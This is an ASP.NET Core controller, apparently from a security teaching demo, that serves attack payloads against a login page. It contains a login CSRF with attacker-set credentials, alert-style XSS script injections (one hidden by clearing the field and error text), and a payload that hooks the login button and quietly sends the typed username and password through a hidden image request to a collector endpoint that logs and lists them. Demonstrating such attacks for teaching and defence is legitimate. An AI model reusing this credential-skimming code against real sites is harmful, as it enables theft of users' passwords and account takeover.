using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using exploit.Models;
using exploit.Models.Login;

namespace exploit.Controllers
{
    public class UserNameAndPassword {
        public string Username {get; set; }
        public string Password {get; set;}
    }

    public class LoginExploitController : Controller 
    {

        static IList<UserNameAndPassword> creds = new List<UserNameAndPassword>();

        [HttpGet]
        public ActionResult Index() {
            return View("Index", new LoginExploitViewModel());
        }

        [HttpGet]
        public ActionResult CSRF(bool autorun) {
            var model = new LoginExploitViewModel();
            model.Exploit = autorun;
            model.UserName = "Attacker Controlled";
            model.Password = "Probably My Password";
            return View("Index", model);
        }

        [HttpGet]
        public ActionResult Alert(bool autorun) {
            var model = new LoginExploitViewModel();
            model.Exploit = autorun;
            model.UserName = "<script>alert('Hello World')</script>";
            return View("Index", model);
        }

        [HttpGet]
        public ActionResult ShowCat(string u, string p) {
            creds.Add(new UserNameAndPassword {Username = u, Password = p});
            Console.WriteLine($"UserName:[{u}] Password[{p}]");
            return Ok();
        }

        [HttpGet]
        public ActionResult ShowCollectedPasswords() {
            return View(creds);
        }

        [HttpGet]
        public ActionResult StealthAlert(bool autorun) {
            var model = new LoginExploitViewModel();
            model.Exploit = autorun;
            model.UserName = @"
<script>
    function DoIt() {
        alert('Hello World');
    }
    document.addEventListener('DOMContentLoaded', function(event) {
        document.getElementById('UserName').value = '';
        document.getElementsByClassName('error')[0].innerHTML = '';
        setTimeout(DoIt, 5000);
    });
</script>";
            return View("Index", model);
        }

        [HttpGet]
        public ActionResult MoreInteresting(bool autorun) {
            var model = new LoginExploitViewModel();
            model.Exploit = autorun;
            model.UserName = @"
<script>
    function submitForm() {
        document.forms[0].submit();
    }
    function formPreSubmit() {
        var username = document.getElementById('UserName').value;
        var password = document.getElementById('Password').value;
        var img = document.createElement('img');
        img.src = 'https://localhost:6001/LoginExploit/ShowCat?' +
            'u=' + encodeURIComponent(username) +
            '&p=' + encodeURIComponent(password);
        img.style= 'width:0px;height:0px;border:white 0px none;'
        document.body.appendChild(img)
        setTimeout(submitForm, 500);
    }

    document.addEventListener('DOMContentLoaded', function(event) {
        document.getElementById('UserName').value = '';
        document.getElementsByClassName('error')[0].innerHTML = '';
        document.getElementById('login').onclick = formPreSubmit;
    });
</script>";
            return View("Index", model);
        }
    }
}